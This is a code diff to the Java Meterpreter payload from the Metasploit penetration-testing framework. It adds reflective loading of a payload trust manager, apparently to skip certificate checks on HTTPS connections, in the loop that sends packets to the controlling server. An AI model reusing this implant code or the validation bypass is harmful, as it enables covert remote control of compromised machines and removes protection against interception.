@@ -167,6 +167,15 @@ public class Meterpreter {
 			TLVPacket request = null;
 			try {
 				URLConnection uc = url.openConnection();
+				if (url.getProtocol().equals("https")) {
+					// load the trust manager via reflection, to avoid loading
+					// it when it is not needed (it requires Sun Java 1.4+)
+					try {
+						Class.forName("com.metasploit.meterpreter.PayloadTrustManager").getMethod("useFor", new Class[] {URLConnection.class}).invoke(null, new Object[] {uc});
+					} catch (Exception ex) {
+						ex.printStackTrace(getErrorStream());
+					}
+				}			
 				uc.setDoOutput(true);
 				OutputStream out = uc.getOutputStream();
 				out.write(outPacket == null ? RECV : outPacket);
